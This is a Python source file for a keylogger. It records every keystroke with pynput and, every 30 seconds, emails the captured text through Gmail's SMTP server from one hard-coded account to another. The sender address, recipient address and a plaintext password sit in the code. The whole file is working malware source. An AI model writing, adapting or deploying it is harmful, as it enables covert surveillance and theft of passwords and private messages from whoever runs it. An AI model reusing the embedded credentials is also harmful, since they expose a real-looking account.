import pynput.keyboard
import smtplib
import threading

log =""
status=0

def callback_function(key):
    global log
    try:
        log=log+key.char.encode("UTF-8").decode()
    except AttributeError:
        if key == key.space:
            log=log+" "
        else:
            log = log+"|"+str(key)+"|"
    except:
        pass
    print(log)

def send_mail(sender,receiver,password,message):
    email_server=smtplib.SMTP("smtp.gmail.com",587)
    email_server.starttls()
    email_server.login(sender,password)
    email_server.sendmail(sender,receiver,message)
    email_server.quit()

def thread_function():
    global log
    global status
    if status == 1:
        send_mail("puguapp@gmail.com","ahmet.91.19.hakan@gmail.com","Brgmp7623.QyTr",log.encode('UTF-8'))
    else:
        status=1
    log=""
    timer_object = threading.Timer(30,thread_function)
    timer_object.start()

keylogger_listener = pynput.keyboard.Listener(on_press=callback_function)


#threading
with keylogger_listener:
    thread_function()
    keylogger_listener.join()
